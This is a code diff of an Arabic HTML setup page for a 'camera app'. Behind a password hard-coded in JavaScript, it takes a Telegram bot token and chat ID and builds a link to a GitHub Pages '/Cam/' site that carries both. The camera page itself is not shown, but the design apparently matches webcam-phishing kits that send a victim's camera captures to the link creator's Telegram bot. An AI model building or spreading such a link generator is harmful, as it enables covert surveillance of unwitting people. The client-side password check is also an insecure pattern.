@@ -3,39 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إعداد التوكن والـ Chat ID</title>
+    <title>إعداد التطبيق</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            margin-top: 20px;
+            font-size: 2.5em;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+            text-align: left;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        input[type="password"] {
+            background: #333;
+            color: white;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1.2em;
+            color: white;
+            background: #ff4b2b;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #ff6f61;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error {
+            color: #ffcccc;
+            margin-bottom: 20px;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #eee;
+        }
+    </style>
 </head>
 <body>
-    <h1>إعداد بيانات التوكن</h1>
-    <form id="setupForm">
-        <label for="token">أدخل التوكن الخاص بالبوت:</label><br>
-        <input type="text" id="token" name="token" required><br><br>
-
-        <label for="chatId">أدخل الـ Chat ID الخاص بك:</label><br>
-        <input type="text" id="chatId" name="chatId" required><br><br>
-
-        <button type="submit">إنشاء رابط</button>
-    </form>
-
-    <p id="result"></p>
+    <h1>إعداد التطبيق</h1>
+    <div class="container">
+        <div id="password-container">
+            <label for="password">أدخل كلمة المرور:</label>
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button onclick="checkPassword()">دخول</button>
+            <p id="error-message" class="error hidden">كلمة المرور غير صحيحة!</p>
+        </div>
+        <div id="form-container" class="hidden">
+            <form id="info-form" onsubmit="generateLink(event)">
+                <label for="token">أدخل التوكن:</label>
+                <input type="password" id="token" placeholder="توكن البوت" required>
+                
+                <label for="chat-id">أدخل معرف الشات:</label>
+                <input type="password" id="chat-id" placeholder="معرف الشات" required>
+                
+                <button type="submit">إنشاء الرابط</button>
+            </form>
+            <p id="result" class="hidden"></p>
+        </div>
+    </div>
+    <footer>© 2024 - إعداد تطبيق الكاميرا</footer>
 
     <script>
-        const form = document.getElementById('setupForm');
-        const result = document.getElementById('result');
+        const PASSWORD = "Q7CamEra7";
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const token = document.getElementById('token').value;
-            const chatId = document.getElementById('chatId').value;
-
-            if (token && chatId) {
-                const baseUrl = window.location.origin + '/Cam/main.html';
-                const customUrl = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
-                result.innerHTML = `<p>رابطك الخاص:</p><a href="${customUrl}" target="_blank">${customUrl}</a>`;
+        function checkPassword() {
+            const passwordInput = document.getElementById("password");
+            const errorMessage = document.getElementById("error-message");
+            if (passwordInput.value === PASSWORD) {
+                document.getElementById("password-container").classList.add("hidden");
+                document.getElementById("form-container").classList.remove("hidden");
             } else {
-                result.textContent = "يرجى إدخال التوكن والـ Chat ID.";
+                errorMessage.classList.remove("hidden");
             }
-        });
+        }
+
+        function generateLink(event) {
+            event.preventDefault();
+            const token = document.getElementById("token").value;
+            const chatId = document.getElementById("chat-id").value;
+
+            const baseUrl = "https://sportsore.github.io/Cam/";
+            const link = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
+
+            const result = document.getElementById("result");
+            result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
+            result.classList.remove("hidden");
+        }
     </script>
 </body>
 </html>
